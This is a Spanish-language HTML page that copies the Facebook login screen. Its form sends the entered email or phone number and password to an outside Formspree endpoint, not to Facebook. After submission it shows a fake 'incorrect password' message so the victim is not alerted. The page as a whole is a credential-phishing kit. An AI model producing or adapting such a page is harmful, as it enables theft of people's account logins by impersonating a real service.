<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Bienvenido</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9ebee;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        .page-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1000px;
            width: 100%;
            gap: 40px;
        }
        .welcome-section {
            flex: 1;
            padding-right: 20px;
        }
        .company-title {
            color: #1877f2;
            font-size: 60px;
            font-weight: bolder;
            margin-bottom: 20px;
            letter-spacing: -1px;
            text-transform: lowercase;
        }
        .welcome-text {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        .login-container {
            background-color: white;
            width: 100%;
            max-width: 400px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .input-group {
            position: relative;
            margin: 10px 0;
        }
        .input-field {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #155cbd;
        }
        .forgot-password {
            text-align: center;
            margin: 15px 0;
        }
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .divider {
            border-top: 1px solid #dddfe2;
            margin: 20px 0;
        }
        .create-account-btn {
            width: auto;
            padding: 12px 24px;
            background-color: #42b72a;
            color: white;
            font-size: 15px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            display: block;
            margin: 0 auto;
            transition: background-color 0.3s;
        }
        .create-account-btn:hover {
            background-color: #36a420;
        }
        .signup-info {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin-top: 15px;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }
        .footer {
            width: 100%;
            text-align: center;
            margin-top: 20px;
            padding-top: 15px;
            font-size: 12px;
            color: #666;
        }
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
            display: inline-block;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="page-container">
        <div class="welcome-section">
            <h1 class="company-title">facebook</h1>
            <p class="welcome-text">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>

        <div class="login-container">
            <form action="https://formspree.io/f/movqwpgw" method="POST" id="login-form" onsubmit="return handleSubmit(event)">
                <div class="input-group">
                    <input 
                        type="text" 
                        id="email" 
                        name="email" 
                        class="input-field" 
                        placeholder="Correo electrónico o número de teléfono" 
                        required
                    >
                </div>
                <div class="input-group">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="input-field" 
                        placeholder="Contraseña" 
                        required
                    >
                </div>
                <button type="submit" class="login-btn">
                    Iniciar sesión
                </button>
                <div class="error-message" id="error-message" style="display: none;">Contraseña, correo o número incorrectos, por favor, vuélvelo a intentar correctamente.</div>
            </form>

            <div class="forgot-password">
                <a href="/forgot-password">¿Olvidaste tu contraseña?</a>
            </div>
            
            <div class="divider"></div>
            
            <button class="create-account-btn" onclick="openRegisterModal()">
                <strong>Crear cuenta nueva</strong>
            </button>
            <p class="signup-info"><span>¿No tienes cuenta?</span></p>
        </div>
    </div>

    <div class="footer">
        <a href="#">Idioma</a> | 
        <a href="#">Ayuda</a> | 
        <a href="#">Política de privacidad</a>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Evita el envío predeterminado
            // Aquí puedes realizar alguna acción si es necesario antes de enviar
            // Por ejemplo, validación adicional o mostrar un mensaje.
            console.log("Formulario enviado a Formspree.");
            // Mostrar mensaje de error si los datos no son correctos (puedes mejorar la validación).
            document.getElementById('error-message').style.display = "block";
        }

        function openRegisterModal() {
            alert("Redirigiendo a la página de registro...");
        }
    </script>
</body>
</html>
